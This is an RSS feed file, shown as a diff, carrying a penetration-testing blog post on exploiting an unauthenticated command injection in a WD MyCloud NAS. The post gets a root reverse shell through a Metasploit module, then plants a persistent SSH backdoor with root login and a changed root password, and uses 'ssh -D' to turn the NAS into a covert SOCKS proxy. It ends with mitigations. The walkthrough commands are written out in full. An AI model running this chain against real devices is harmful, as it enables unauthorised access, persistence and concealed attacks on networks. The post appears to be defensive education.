@@ -1,0 +1,198 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Pivoting on Gill.Singh.A</title>
+        <link>https://Gill-Singh-A.github.io/tags/pivoting/</link>
+        <description>Recent content in Pivoting on Gill.Singh.A</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Fri, 07 Aug 2026 13:00:00 +0530</lastBuildDate><atom:link href="https://Gill-Singh-A.github.io/tags/pivoting/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>The NAS Nobody Patched - From Unauthenticated RCE to Network Proxy via WD MyCloud</title>
+        <link>https://Gill-Singh-A.github.io/p/the-nas-nobody-patched-from-unauthenticated-rce-to-network-proxy-via-wd-mycloud/</link>
+        <pubDate>Fri, 07 Aug 2026 13:00:00 +0530</pubDate>
+        
+        <guid>https://Gill-Singh-A.github.io/p/the-nas-nobody-patched-from-unauthenticated-rce-to-network-proxy-via-wd-mycloud/</guid>
+        <description>&lt;img src="https://Gill-Singh-A.github.io/p/the-nas-nobody-patched-from-unauthenticated-rce-to-network-proxy-via-wd-mycloud/assets/images/reverse_shell.png" alt="Featured image of post The NAS Nobody Patched - From Unauthenticated RCE to Network Proxy via WD MyCloud" /&gt;&lt;p&gt;In this blog, I&amp;rsquo;ll walk through how an &lt;strong&gt;unauthenticated command injection&lt;/strong&gt; in a WD MyCloud NAS gave me a reverse shell as &lt;strong&gt;root&lt;/strong&gt;, how I bootstrapped a persistent &lt;strong&gt;SSH backdoor&lt;/strong&gt; on a device that didn&amp;rsquo;t even have SSH running, and how I turned that NAS into a &lt;strong&gt;covert SOCKS proxy&lt;/strong&gt; with a single SSH flag.&lt;/p&gt;
+&lt;h2 id=&#34;prologue&#34;&gt;Prologue
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;&amp;ldquo;There is no cloud. It&amp;rsquo;s just someone else&amp;rsquo;s computer.&amp;rdquo;&lt;/strong&gt;&lt;br&gt;
+&lt;em&gt;- Common saying in information security&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The Western Digital MyCloud sits in a server room or under a desk, quietly storing backups, documents, and shared files for an entire team. Its name says &amp;ldquo;cloud,&amp;rdquo; but it&amp;rsquo;s a Linux box running on an ARM processor with its own network interface and its own IP address. When it has an unpatched vulnerability in its web interface, the device trusted with your data becomes another computer on the network that an attacker can use.&lt;/p&gt;
+&lt;h2 id=&#34;what-is-wd-mycloud&#34;&gt;What is WD MyCloud?
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Western Digital MyCloud&lt;/strong&gt; is a line of &lt;strong&gt;Network Attached Storage (NAS)&lt;/strong&gt; devices designed for personal and small-business use. They provide file sharing, backups, and remote access through a web-based management interface over &lt;strong&gt;HTTPS (port 443)&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Under the hood, a MyCloud runs &lt;strong&gt;embedded Linux&lt;/strong&gt; on an &lt;strong&gt;ARM processor&lt;/strong&gt;. It has a full filesystem, a web server, and network services, everything a general-purpose Linux box has, packaged into a device that most people treat as an appliance and never think to patch.&lt;/p&gt;
+&lt;h2 id=&#34;the-vulnerability---unauthenticated-command-injection&#34;&gt;The Vulnerability - Unauthenticated Command Injection
+&lt;/h2&gt;&lt;p&gt;The MyCloud web interface contains a &lt;strong&gt;command injection vulnerability&lt;/strong&gt; that allows a remote, completely &lt;strong&gt;unauthenticated&lt;/strong&gt; attacker to execute arbitrary operating-system commands on the device. No login, no session, no credential of any kind is required. A crafted HTTP request to the HTTPS management interface is enough.&lt;/p&gt;
+&lt;p&gt;Metasploit ships a ready-made module for this: &lt;strong&gt;&lt;code&gt;exploit/linux/http/wd_mycloud_unauthenticated_cmd_injection&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;exploitation---reverse-shell&#34;&gt;Exploitation - Reverse Shell
+&lt;/h2&gt;&lt;p&gt;I loaded the Metasploit module, pointed it at the target, and ran it:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use exploit/linux/http/wd_mycloud_unauthenticated_cmd_injection
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; RHOSTS x.x.x.x
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exploit
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://Gill-Singh-A.github.io/p/the-nas-nobody-patched-from-unauthenticated-rce-to-network-proxy-via-wd-mycloud/assets/images/exploit_options.png&#34;
+	width=&#34;1727&#34;
+	height=&#34;913&#34;
+	srcset=&#34;https://Gill-Singh-A.github.io/p/the-nas-nobody-patched-from-unauthenticated-rce-to-network-proxy-via-wd-mycloud/assets/images/exploit_options_hu5037924607508908117.png 480w, https://Gill-Singh-A.github.io/p/the-nas-nobody-patched-from-unauthenticated-rce-to-network-proxy-via-wd-mycloud/assets/images/exploit_options_hu13756667857306921810.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Metasploit module options for WD MyCloud command injection&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;189&#34;
+		data-flex-basis=&#34;453px&#34;
+	
+&gt;&lt;br /&gt;
+The module confirmed the target was a WD MyCloud, verified the injection point, and delivered a &lt;strong&gt;reverse shell&lt;/strong&gt; back to my machine:&lt;br /&gt;
+&lt;img src=&#34;https://Gill-Singh-A.github.io/p/the-nas-nobody-patched-from-unauthenticated-rce-to-network-proxy-via-wd-mycloud/assets/images/reverse_shell.png&#34;
+	width=&#34;1111&#34;
+	height=&#34;260&#34;
+	srcset=&#34;https://Gill-Singh-A.github.io/p/the-nas-nobody-patched-from-unauthenticated-rce-to-network-proxy-via-wd-mycloud/assets/images/reverse_shell_hu5175995690947653096.png 480w, https://Gill-Singh-A.github.io/p/the-nas-nobody-patched-from-unauthenticated-rce-to-network-proxy-via-wd-mycloud/assets/images/reverse_shell_hu18258492647284815331.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Reverse shell obtained on the WD MyCloud NAS&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;427&#34;
+		data-flex-basis=&#34;1025px&#34;
+	
+&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;uname -a&lt;/code&gt; confirmed what I&amp;rsquo;d landed on:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Linux WDMyCloudEX4100 3.10.39 #1 SMP ... armv7l GNU/Linux
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;A &lt;strong&gt;WD MyCloud EX4100&lt;/strong&gt;, running a kernel from 2016, on a 32-bit ARM processor. Root-level command execution on the NAS, obtained without a single credential.&lt;/p&gt;
+&lt;h2 id=&#34;bootstrapping-ssh-from-scratch&#34;&gt;Bootstrapping SSH from Scratch
+&lt;/h2&gt;&lt;p&gt;The reverse shell was functional but fragile. For a stable, persistent connection (and for the proxy that comes later), I needed &lt;strong&gt;SSH&lt;/strong&gt;. The problem: the device didn&amp;rsquo;t have an SSH daemon running, and didn&amp;rsquo;t have host keys generated. I had to build the entire SSH infrastructure from the reverse shell.&lt;/p&gt;
+&lt;h3 id=&#34;generating-host-keys&#34;&gt;Generating Host Keys
+&lt;/h3&gt;&lt;p&gt;SSH refuses to start without host keys. I generated them on the device:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;No passphrase on either key, since they&amp;rsquo;re host keys.&lt;/p&gt;
+&lt;h3 id=&#34;configuring-the-daemon&#34;&gt;Configuring the Daemon
+&lt;/h3&gt;&lt;p&gt;I edited the SSH daemon configuration (&lt;code&gt;/usr/etc/sshd_config&lt;/code&gt;) to allow root login and set a non-standard port, and changed the root password in &lt;code&gt;/etc/shadow&lt;/code&gt; so I could authenticate over SSH.&lt;/p&gt;
+&lt;h3 id=&#34;starting-ssh&#34;&gt;Starting SSH
+&lt;/h3&gt;&lt;p&gt;With keys and config in place, I started the daemon in the background:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/sbin/sshd &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;ssh-as-root&#34;&gt;SSH as Root
+&lt;/h3&gt;&lt;p&gt;From my machine, I connected directly:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh -p &lt;span class=&#34;m&#34;&gt;42822&lt;/span&gt; root@x.x.x.x
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://Gill-Singh-A.github.io/p/the-nas-nobody-patched-from-unauthenticated-rce-to-network-proxy-via-wd-mycloud/assets/images/ssh_root_login.png&#34;
+	width=&#34;644&#34;
+	height=&#34;127&#34;
+	srcset=&#34;https://Gill-Singh-A.github.io/p/the-nas-nobody-patched-from-unauthenticated-rce-to-network-proxy-via-wd-mycloud/assets/images/ssh_root_login_hu2064132160768181927.png 480w, https://Gill-Singh-A.github.io/p/the-nas-nobody-patched-from-unauthenticated-rce-to-network-proxy-via-wd-mycloud/assets/images/ssh_root_login_hu9896353803423088089.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;SSH root login to the WD MyCloud NAS&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;507&#34;
+		data-flex-basis=&#34;1217px&#34;
+	
+&gt;&lt;br /&gt;
+&lt;strong&gt;uid=0(root)&lt;/strong&gt;, a proper interactive root shell over SSH. The connection survives indefinitely, survives reboots of the attacker&amp;rsquo;s machine, and provides the stable tunnel needed for what comes next.&lt;/p&gt;
+&lt;h2 id=&#34;turning-the-nas-into-a-network-proxy&#34;&gt;Turning the NAS into a Network Proxy
+&lt;/h2&gt;&lt;p&gt;SSH has a built-in feature that turns any SSH connection into a &lt;strong&gt;SOCKS proxy&lt;/strong&gt; with a single flag: &lt;strong&gt;&lt;code&gt;-D&lt;/code&gt;&lt;/strong&gt; (dynamic port forwarding).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh -p &lt;span class=&#34;m&#34;&gt;42822&lt;/span&gt; -D &lt;span class=&#34;m&#34;&gt;1080&lt;/span&gt; -N root@x.x.x.x
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;That&amp;rsquo;s it. One command, and a &lt;strong&gt;SOCKS5 proxy&lt;/strong&gt; is now listening on &lt;code&gt;127.0.0.1:1080&lt;/code&gt; on the attacker&amp;rsquo;s machine. Every connection sent through that proxy travels through the SSH tunnel and exits from the NAS&amp;rsquo;s network interface.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;-D 1080&lt;/code&gt;&lt;/strong&gt; opens a local SOCKS proxy on port 1080&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;-N&lt;/code&gt;&lt;/strong&gt; tells SSH not to execute a remote command (just keep the tunnel open)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Any application that supports SOCKS5 (a browser, &lt;code&gt;proxychains&lt;/code&gt;, &lt;code&gt;curl --socks5&lt;/code&gt;, scanners) can now route its traffic through the NAS. The destination sees the NAS&amp;rsquo;s IP address, not the attacker&amp;rsquo;s. The traffic looks like a NAS doing what NAS devices do: talking to the network.&lt;/p&gt;
+&lt;p&gt;No additional tools, no chisel, no Meterpreter, just SSH doing what SSH was designed to do.&lt;/p&gt;
+&lt;h3 id=&#34;forward-vs-reverse&#34;&gt;Forward vs. Reverse
+&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;ssh -D&lt;/code&gt; approach works when the attacker can reach the NAS directly. If the NAS is behind a firewall that blocks inbound connections, the same trick works in reverse using &lt;strong&gt;&lt;code&gt;ssh -R&lt;/code&gt;&lt;/strong&gt; from the NAS back to the attacker, carrying the SOCKS proxy through the outbound connection.&lt;/p&gt;
+&lt;h2 id=&#34;attack-path&#34;&gt;Attack Path
+&lt;/h2&gt;&lt;p&gt;The full chain, from an unpatched NAS to covert network proxy:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Discover a WD MyCloud NAS on the network (port 443).&lt;/li&gt;
+&lt;li&gt;Exploit the &lt;strong&gt;unauthenticated command injection&lt;/strong&gt; via Metasploit.&lt;/li&gt;
+&lt;li&gt;Obtain a &lt;strong&gt;reverse shell&lt;/strong&gt; as root.&lt;/li&gt;
+&lt;li&gt;Generate SSH host keys on the device.&lt;/li&gt;
+&lt;li&gt;Configure and start the &lt;strong&gt;SSH daemon&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;Change the root password for SSH authentication.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SSH in as root&lt;/strong&gt; from the attacker&amp;rsquo;s machine.&lt;/li&gt;
+&lt;li&gt;Run &lt;strong&gt;&lt;code&gt;ssh -D&lt;/code&gt;&lt;/strong&gt; to create a local &lt;strong&gt;SOCKS5 proxy&lt;/strong&gt; tunneled through the NAS.&lt;/li&gt;
+&lt;li&gt;Point any application at the SOCKS proxy.&lt;/li&gt;
+&lt;li&gt;All traffic now exits from the &lt;strong&gt;NAS&amp;rsquo;s IP address&lt;/strong&gt;, the attacker is hidden.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;mitigations&#34;&gt;Mitigations
+&lt;/h2&gt;&lt;p&gt;A compromised NAS is a worst-case scenario: it holds your data &lt;em&gt;and&lt;/em&gt; gives the attacker a network foothold. To break this chain:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Update firmware immediately.&lt;/strong&gt; WD has released patches for this vulnerability. Every unpatched MyCloud device is an unauthenticated root shell.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Never expose the management interface to untrusted networks.&lt;/strong&gt; The HTTPS interface (port 443) should only be reachable from a management VLAN or specific admin workstations, never the general LAN.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Disable remote access features&lt;/strong&gt; unless actively needed. WD MyCloud&amp;rsquo;s &amp;ldquo;remote access&amp;rdquo; and &amp;ldquo;cloud&amp;rdquo; features widen the attack surface significantly.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Segment NAS devices.&lt;/strong&gt; A NAS should be on a dedicated storage VLAN with strict firewall rules. It needs to talk to clients on specific ports (SMB, NFS), not to the entire network.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Monitor for unusual services.&lt;/strong&gt; A NAS suddenly listening on a new port (like SSH on 42822) is a strong indicator of compromise.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Audit stored data.&lt;/strong&gt; After any NAS compromise, assume all stored files have been accessed. Rotate credentials stored on or accessible through the NAS.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;note&#34;&gt;Note
+&lt;/h3&gt;&lt;p&gt;The above measures reduce risk significantly but do not guarantee 100% protection - defence in depth is the goal.&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion
+&lt;/h2&gt;&lt;p&gt;A NAS is a computer. It runs Linux, has root, and sits on the network with access to everything that talks to it. When its web interface carries an unpatched command injection, a single Metasploit module turns it into a root shell. From there, SSH is bootstrapped from nothing, and one flag (&lt;code&gt;-D&lt;/code&gt;) turns the entire connection into a SOCKS proxy. No extra tools, no payloads, just the device&amp;rsquo;s own operating system turned against the network it serves.&lt;/p&gt;
+&lt;p&gt;The NAS stores your files, serves your backups, and is trusted by every machine that mounts it. That trust is exactly what makes it the perfect place to route traffic nobody will question.&lt;/p&gt;
+&lt;h2 id=&#34;references&#34;&gt;References
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2016-10108&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CVE-2016-10108 - WD MyCloud Command Injection (NVD)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://docs.rapid7.com/metasploit/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Metasploit - WD MyCloud Unauthenticated Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://man.openbsd.org/ssh#D&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;SSH Dynamic Port Forwarding (SOCKS Proxy)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://book.hacktricks.xyz/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;HackTricks - Pentesting NAS/Storage&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.westerndigital.com/support/product-security&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Western Digital Security Advisories&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
